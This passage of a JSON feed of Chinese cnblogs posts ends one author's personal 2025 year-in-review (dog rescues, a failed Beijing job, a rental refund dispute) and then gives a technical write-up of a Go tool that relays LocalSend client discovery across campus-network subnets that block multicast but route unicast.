/></p>\n<p>第一只是中华田园犬，在公园遇到的。它很瘦，眼神怯，但又不躲人。</p>\n<p>第二只是边牧，在公司附近，它更像是走丢的孩子，聪明又无助。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第三只是阿拉斯加，在豫园附近，体型很大，却一点安全感都没有。</p>\n<p>我喜欢狗。遇见它们的时候，我很难装作没看见。我做的事其实也不复杂：拍照、发帖、联系、筛选领养人、把信息对齐清楚，然后送它们去新家。</p>\n<p>这件事最打动我的，不是我多善良，而是我发现：大城市真的有很多愿意伸手的人。我发出求助，真的会有人回应。我以为我在救它们，其实在某些时刻，是这些善意在把我从疲惫里接住。</p>\n<hr />\n<h2 id=\"8-一笔沉没成本止损维权和不再委屈自己\">8. 一笔沉没成本：止损、维权、和不再委屈自己</h2>\n<p>十二月初，北京给了我最硬的一课。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我在北京待了十来天，一直住酒店。对方之前说会报销，但后来什么都没有。入职前一天我找了房子，租房费用、中介费用、再加上各种奔波成本，堆起来是一笔不小的支出。更糟的是：入职第一天我就通过另一位同样处境的人了解到了真实情况；再加上“他”下班后说的一些话，我很快确定——这里不是我该待的地方。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一刻最难的其实不是离开，而是面对沉没成本。我已经付出那么多，我会本能地想“再忍忍，再等等”。但我很庆幸，那天我没骗自己。我选择止损。</p>\n<p>随之而来的就是维权。房子我没入住，合同日期也没开始，但管家很无赖，甚至带着恐吓。那种“我讲理他就耍赖”的感觉很恶心。我一开始也很烦，后来干脆不和她废话，直接走流程，通过 12315 协调，拿回了一部分。理论上可以拿回更多，但要继续耗时间精力，我当时选择到此为止。</p>\n<p>这一段时间，让家里也没少操心，哎....</p>\n<p>我最想写给自己的不是“钱亏了”，而是一个更重要的结论：<strong>以后遇到不公，我不再用委屈换和平。该维权就维权，该翻脸就翻脸。</strong></p>\n<hr />\n<h2 id=\"9-回到上海我把自己一点点拉回正轨\">9. 回到上海：我把自己一点点拉回正轨</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十二月中旬我回到了上海。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>收拾好家里的工位</p>\n<p>那段时间我能量很低。不是累，是一种被现实撞过之后的钝。我会怀疑自己、怀疑判断、怀疑信任，甚至怀疑“是不是我太敏感了”。但生活不会等我缓过来，它只会继续往前。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我做的第一件事是把我自己拉回正常：吃饭、睡觉、见朋友。后来我和老耿去了杭州散心。城市很安静，走在路上我突然发现：风还是一样吹，灯还是一样亮，我不会因为受挫就失去明天。</p>\n<p>我慢慢控住场了。把生活拉回正轨了。也把那句最重要的话重新捡回来——<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<hr />\n<h2 id=\"最后\">最后</h2>\n<p>回头看 2025 年，我最大的变化不是“我做了多少”，而是<strong>我对人生结构的要求变高了</strong>。</p>\n<p>以前我会把努力当成答案。现在我更在意：这份努力能不能沉淀，能不能让我拥有更多选择权。以前我遇到烂事会先忍，想着“算了”。但北京那一段之后我更确定：委屈不会换来尊重，只会换来下一次更大的代价。该止损就止损，该维权就维权——哪怕沉没成本已经砸下去，我也要把自己从泥里拎出来。</p>\n<p>这一年我也完成了一次祛魅：<br />\n对“机会”的祛魅，对“关系”的祛魅，对“画出来的未来”的祛魅。<br />\n我开始相信一句话：<strong>真正值得的机会，不会只靠嘴说；真正可靠的人，也不会只靠情绪绑架。</strong></p>\n<p>如果说 2025 年教会了我什么，我觉得是三件事：</p>\n<p>第一，能力不是拿来逞强的，是拿来兜底的。<br />\n我在最狼狈的时候，靠自己把局面稳住了。那种“我能扛住”的底气，是真的。</p>\n<p>第二，钱花在家人身上，会变成一种很踏实的成就感。<br />\n我以前以为成就感来自外界认可，今年我更确定：来自父母的笑、来自家人的安心、来自“我可以照顾他们”。</p>\n<p>第三，善意是会流动的。<br />\n我帮过人，也被人帮过；我救过狗，也被陌生人的热心治愈过。世界不全是烂人，但我得学会识别，学会筛选，学会保护自己。</p>\n<p>2026 年我不想再喊口号了。我只想做三件更具体的事：</p>\n<ul>\n<li><strong>把一条能长期跑的主线做出来</strong>：让输出、作品和服务真正形成稳定的节奏，而不是靠运气起伏。</li>\n<li><strong>给信任立规矩</strong>：合作要有边界，承诺要能落地，任何决定都要留后手。</li>\n<li><strong>把家放进计划里</strong>：不是“有空再说”，而是本来就该排在前面。</li>\n</ul>\n<p>2025 年没有把我推到高处，但它把我从幻觉里拽出来了。<br />\n我依然会往前走，只是以后我更在乎的不是速度，而是方向；不是热闹，而是结构。</p>\n<p><strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>希望2026年一切顺利!</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 15:50</span>&nbsp;\n<a href=\"https://www.cnblogs.com/HaiJun-Aion\">程序员海军</a>&nbsp;\n阅读(<span id=\"post_view_count\">283</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【小记】解决校园网中单播互通的不同子网间的 LocalSend 发现问题",
      "link": "https://www.cnblogs.com/somebottle/p/19497343/simple_report_of_localsend_switch",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/somebottle/p/19497343/simple_report_of_localsend_switch\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 23:05\">\n    <span>【小记】解决校园网中单播互通的不同子网间的 LocalSend 发现问题</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"【小记】解决校园网中单播互通的不同子网间的 LocalSend 发现问题\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/2588810/202601/2588810-20260117230317162-937114161.png\" />\n        这回来折腾一下怎么在多播隔离、单播允许的局域网（比如校园网）子网之间实现 LocalSend 客户端的互相发现。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>各位好久不见~下半年又是忙论文又是忙项目的，实在是没什么时间更新笔记了。趁着今天有点空闲，咱来写写最近抽空解决的一个小网络问题叭（゜ー゜）。</p>\n<h2 id=\"0-问题背景\">0. 问题背景</h2>\n<p>咱实验室有一台连接着打印机的计算机，我们在这台机器上挂了一个专门注册的 QQ 账号，需要打印文件时把文件发送到这个 QQ 账号上，在打印机计算机上下载下来就行了。</p>\n<p>但是吧，像是比较机密文件的话，如果这样过一道别人的服务器感觉不太好，正好咱当时也找到了局域网文件传输工具 LocalSend，遂试了试。</p>\n<p>结果我发现，打印机计算机上的 LocalSend 客户端无法发现我笔记本上的 LocalSend 端，反之亦然。我还得到打印机计算机上手动输入笔记本电脑被分配的 IP 地址才能传输文件，略显麻烦。</p>\n<ul>\n<li>更不提校园网这有线网和无线网给设备分配的全是动态 IP，可能过一段时间就会变。</li>\n</ul>\n<p><img alt=\"Analyzing\" src=\"https://serv.xbottle.top/i/https://raw.githubusercontent.com/cat-note/bottleassets/main/img/BDE19D9F629D18E59D1752BDB5FDBFDE-2026-01-17.jpg\" /></p>\n<p>分析了一下发现：</p>\n<ol>\n<li>\n<p>没有办法互相发现是因为，我的笔记本接入的是校园网无线网络，而打印机计算机接入的是有线网络，两个主机在<strong>不同的子网段</strong>内，这阻隔了 LocalSend 发出的组播包 (可以参考 <a href=\"https://github.com/localsend/protocol\" rel=\"noopener nofollow\" target=\"_blank\">LocalSend 协议</a>)。</p>\n</li>\n<li>\n<p>可以手动输入 IP 地址来指定客户端传输文件，是因为 LocalSend 实际的传输等请求是<strong>单播</strong>的，而校园网在三层设备上有配置路由转发，所以单播包是可以互通的。</p>\n</li>\n</ol>\n<p>于是咱要解决的问题就是，如何在这种<strong>多播 (组播) 隔离但是单播互通</strong>的不同局域子网间实现 LocalSend 的发现功能。</p>\n<h2 id=\"1-问题描述\">1. 问题描述</h2>\n<p><img alt=\"Issue Illustration\" src=\"https://serv.xbottle.top/i/https://raw.githubusercontent.com/SomeBottle/localsend-switch/refs/heads/main/pics/issue_illustration.drawio.png\" /></p>\n<blockquote>\n<p>Figure 1: 问题示意图。 可以看到 VLAN 0 中的 LocalSend 客户端无法成功发现 VLAN 2 中的 LocalSend 客户端，反之亦然。</p>\n</blockquote>\n<p>LocalSend 客户端采用 UDP 组播来把自己的存在通告给局域网中其他客户端。然而，像校园网这种大型局域网，通常为了管理和减小广播域规模等目的，会将网络划分为多个 VLAN（虚拟局域网），对应多个子网，即使是现实中距离很近的两个设备，也有可能在不同的 VLAN 中。</p>\n<ul>\n<li>比如我连接到校园网 WiFi 的笔记本电脑和连接有线校园网的实验室打印机电脑，虽然在同一间屋子，但就是处于不同网段的网络中。</li>\n</ul>\n<p>不同子网之间的数据转发依赖于第三层路由设备来实现，不幸的是，LocalSend 向 <code>224.0.0.x</code> 组播地址及应用端口发送的 UDP 报文段是不会被三层设备转发的，而且其 TTL 值为 <code>1</code>，Wireshark 抓包如下：</p>\n<p><img alt=\"Wireshark Capture\" src=\"https://serv.xbottle.top/i/https://raw.githubusercontent.com/SomeBottle/localsend-switch/refs/heads/main/pics/wireshark_captured.png\" /></p>\n<blockquote>\n<p>Figure 2: Wireshark 抓包显示 LocalSend 发送的组播 UDP 报文段的 TTL 值为 1。</p>\n</blockquote>\n<p>因此就有了明明两台设备近在咫尺，但是却没法互相发现对方 LocalSend 客户端的尴尬局面 ㄟ( ▔, ▔ )ㄏ。</p>\n<h2 id=\"2-解决问题\">2. 解决问题</h2>\n<h3 id=\"20-思路\">2.0. 思路</h3>\n<p>尽管多播被隔离了，但是办公区校园网在三层配置上是会转发单播包的，我可以通过单播和不同的 VLAN 中的主机进行通信。</p>\n<p>一个 LocalSend 客户端在尝试发现局域网内其他客户端时，会发送组播 UDP 包来声明自己的存在，其他客户端收到组播包后会通过<strong>单播的 HTTP 请求</strong>来在这个客户端上进行注册。因为单播可以跨 VLAN，所以这个注册操作是可以实现的，我可以<strong>替 LocalSend 客户端向局域网内的其他 LocalSend 客户端发送注册请求</strong>，从而实现跨 VLAN 的发现和注册。</p>\n<p>从官方的协议文档可以看到 LocalSend 的通告包和注册请求的负载中都只有端口信息，没有源 IP 信息，<strong>客户端在处理到来的请求时实际上是从网络层分组头部获取到源 IP 地址</strong>的，因此这个请求必须从 LocalSend 客户端所处的主机上发出。为了实现这点，我可以<strong>在每台有 LocalSend 的主机上都额外运行一个工具进程来代发注册请求</strong>。</p>\n<p>关键的问题来了，这些工具进程怎么知道局域网内其他 LocalSend 客户端的存在呢？其实我可以借助单播传输来实现这些工具进程之间的通信，从而让它们<strong>互相交换</strong>各自了解的 LocalSend 客户端信息。</p>\n<p>为了解决动态 IP 的问题，我可以把其中一个或多个工具进程作为交换节点<strong>部署在拥有静态 IP 的服务器</strong>上（内网和外网的均可），然后让其他工具进程连接到这些交换节点，当交换过程收敛时，这些工具进程就能互相了解对方所处主机上的 LocalSend 客户端信息了（也让 LocalSend 客户端互相知晓了对方的存在）。</p>\n<p>正好最近学了 Go 语言，照着上面这个思路实现下来，LocalSend Switch 这个工具就诞生辣！٩(&gt;௰&lt;)و</p>\n<ul>\n<li>简单来说 LocalSend Switch 充当的角色就有点类似于 BT 下载中的 Tracker 服务器了，但同时也会帮忙发送单播的注册请求，用于辅助<strong>组播隔离、单播允许</strong>的局域网子网之间的 LocalSend 客户端互相发现。</li>\n</ul>\n<h3 id=\"21-工作原理\">2.1. 工作原理</h3>\n<p><img alt=\"Switch Strategy Illustration\" src=\"https://serv.xbottle.top/i/https://raw.githubusercontent.com/SomeBottle/localsend-switch/refs/heads/main/pics/switch_strategy_illustration.drawio.png\" /></p>\n<blockquote>\n<p>Figure 3: LocalSend Switch 的工作原理示意图。实线表示的是单播分组的传播路径，虚线表示的是 TCP 逻辑连接；虚线上的箭头对应数据在逻辑上的传播方向。LocalSend 客户端和 Switch 进程的旁边标记了连接端口，只有 VLAN 1 中的 Switch 进程监听了服务端口 <code>7761</code>，其余两个 Switch 进程的均为 OS 分配的临时端口；LocalSend 客户端默认服务端口是 <code>53317</code>。</p>\n</blockquote>\n<p>Fig.3 为 LocalSend Switch 的工作原理示意图，展示了单次的客户端信息传播以及注册请求代发的过程。图中，首先 <code>10.84.0.0/15</code> 网段中 <code>10.84.123.223</code> 这台主机上的 LocalSend 客户端发送了组播包，通告自己的存在，被同一台机器上的 LocalSend Switch 捕获到，Switch 进程随后将该通告信息通过单播发送 (图中标记为 <code>CLIENT ANNOUNCE</code>，传播路径为蓝色) 给它所连接的所有 Switch 节点 (图中只有 <code>192.168.232.47:7761</code> 这一个)。</p>\n<ul>\n<li>发送的数据中封装了 LocalSend <strong>客户端的 IP 和端口</strong>，无论被转发多少次，这部分数据都不会变，指向<strong>最初发出</strong>这条通告信息的 LocalSend 客户端。</li>\n</ul>\n<p><code>47</code> 主机上 Switch 节点接收到通告的客户端信息后，会将该信息转发至它所连接的<strong>其他</strong> Switch 节点（图中只有 <code>10.94.23.114:52341</code>），图中标记为 <code>FORWARD ANNOUNCE</code>，传播路径为紫色。因为这台主机上没有 LocalSend 客户端，所以不会有注册请求的代发操作。</p>\n<p><code>114</code> 主机上的 Switch 节点接收到通告信息后，会将该信息发送给它所连接的其他所有 Switch 节点（图中没有其他节点了）；因为这台主机上有 LocalSend 客户端，所以 Switch 节点随后会向通告信息中携带的 LocalSend 客户端地址 (图中为 <code>10.84.123.223:53317</code> ) 发送 HTTP(S) 注册请求（图中标记为 <code>REGISTER CLIENT</code>，传播路径为棕色），告知对方本地客户端的 IP 和地址 (图中为 <code>10.94.23.114:53317</code>)，完成注册请求的代发操作。注意这个注册请求是直接由 Switch 发送给 LocalSend 客户端的。</p>\n<p>实际上每个 Switch 节点都有这样的转发功能，甚至可以在逻辑上串联或者组成树形、星型、网状、混合等拓扑结构。</p>\n<h2 id=\"3-更进一步\">3. 更进一步</h2>\n<p>解决了 LocalSend 互相发现的问题后，我又考虑并解决了以下几个问题：</p>\n<ol>\n<li>传输安全性问题。</li>\n<li>交换信息的环路问题。</li>\n<li>自启动问题。</li>\n</ol>\n<blockquote>\n<p>注：这节的 \"Switch\" 均指 LocalSend Switch 工具。</p>\n</blockquote>\n<h3 id=\"30-传输安全性问题\">3.0. 传输安全性问题</h3>\n<p>Switch 节点间的数据传输在 TCP 连接上进行，默认情况下是<strong>明文</strong>的，其中主要是 LocalSend 客户端的主机的地址、设备型号等信息。</p>\n<p>尽管在校园网这种较为可信的局域网中不用担心遭到中间人攻击，而且传输的数据本身也没有那么敏感，但如果中间有的 Switch 节点在外网上，就还是有一定风险的，如中间人可以伪造 LocalSend 客户端信息，诱导其他 Switch 节点向恶意构造的内网客户端地址发送注册请求，从而造成拒绝服务攻击 (DoS)。</p>\n<p>为此咱考虑过 <strong>TLS</strong> 加密传输，但是考虑到配置和证书管理的复杂性，最终选择了<strong>预共享密钥</strong> (PSK) 方式来对传输的数据进行简单的对称加密，即持有相同密钥的 Switch 节点才能互相通信，传输的是密文。</p>\n<ul>\n<li>\n<p>另外为了防止接收到恶意构造的 LocalSend 客户端信息，限制每个 Switch 节点<strong>仅可向私有 IP 地址发送</strong> HTTP(S) 注册请求，避免主机被利用向公网地址发送请求。</p>\n</li>\n<li>\n<p>这个工具的使用场景实际上挺简单的，因此这个程度的安全性应该已经足够了 (*￣０￣)ノ。</p>\n</li>\n</ul>\n<h3 id=\"31-交换信息的环路问题\">3.1. 交换信息的环路问题</h3>\n<p>本科学计算机网络时，在网络层这一块就听老师讲过环路问题。而本工具如果不加以限制也会导致同一条 LocalSend 客户端信息被疯狂重复转发，浪费带宽和计算资源。</p>\n<p>为了解决这点咱采用了两个措施：</p>\n<ol>\n<li>\n<p><strong>经典的 TTL 机制</strong>。给每条消息都设置一个 TTL 字段，每经过一个 Switch 节点 TTL 则减 <code>1</code>，当其减到 <code>0</code> 时该消息就不再被转发。</p>\n</li>\n<li>\n<p><strong>唯一 ID 缓存机制</strong>。每条信息都有一个唯一 ID，由 Switch 节点的<em>临时随机标识</em>以及<em>消息的递增编号</em>组成。每个 Switch 节点都会避免重复把相同 ID 的客户端信息重复加入转发缓冲区，也就不会重复转发已经转发过的 LocalSend 客户端信息。</p>\n<ul>\n<li>这个唯一 ID 缓存是有过期时间的，咱默认设置为了 <code>5</code> 分钟，以防止内存无限增长。</li>\n<li><em>临时随机标识</em>是在 Switch 启动时生成的，重启后会改变，因此重启后的 Switch 节点会被认为是一个新的节点。</li>\n<li><strong>唯一 ID 机制</strong>还能一定程度上防止重放攻击。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"32-自启动问题\">3.2. 自启动问题</h3>\n<p>如果每次使用 LocalSend Switch 都需要手动启动的话，多少还是有些麻烦，因此咱特地还写了开机 (登录后) 自启的相关配置模块，目前支持了 Windows 和 Linux (带桌面)。</p>\n<ul>\n<li>Windows 下是参考了 LocalSend 的自启动实现，往注册表里写入了开机自启项。</li>\n<li>Linux 下则是依照 FreeDesktop 的 <a href=\"https://specifications.freedesktop.org/desktop-entry/latest/recognized-keys.html\" rel=\"noopener nofollow\" target=\"_blank\">Desktop Entry</a> 规范，写入了 <code>~/.config/autostart/</code> 目录下。</li>\n<li>MacOS...咳咳，咱还没苹果电脑呢，暂时没法测试和实现 Or2...</li>\n</ul>\n<h2 id=\"4-项目地址--总结\">4. 项目地址 &amp; 总结</h2>\n<p>✨ 项目地址: <a href=\"https://github.com/SomeBottle/localsend-switch\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/SomeBottle/localsend-switch</a></p>\n<p>一顿折腾下来，咱又花了好多时间写了这样一个使用场景其实挺小众的工具...不过总的来说还是挺有趣的，一方面熟悉了 Go 语言程序的基本思想和编写规范，另一方面也复习复习了一下计算机网络和基本的网络编程知识（像是手动去搭个 TCP 服务，实现简单的连接维护等等）。</p>\n<ul>\n<li>复习归复习，个人学艺不精，难免有疏漏之处，请各位多指教！</li>\n</ul>\n<p>动手去解决些实际问题，总归是个不错的学习途径呢 (๑•̀ㅂ•́)و✧</p>\n<p>转眼也 2026 了，祝各位新年快乐，事业顺利！咱们下一篇文章再会~ (づ￣ ³￣)づ</p>\n<p><img alt=\"drink_coffee-2026-01-17\" src=\"https://serv.xbottle.top/i/https://raw.githubusercontent.com/cat-note/bottleassets/main/img/drink_coffee-2026-01-17.gif\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 23:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/somebottle\">SomeBottle</a>&nbsp;\n阅读(<span id=\"post_view_count\">12</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}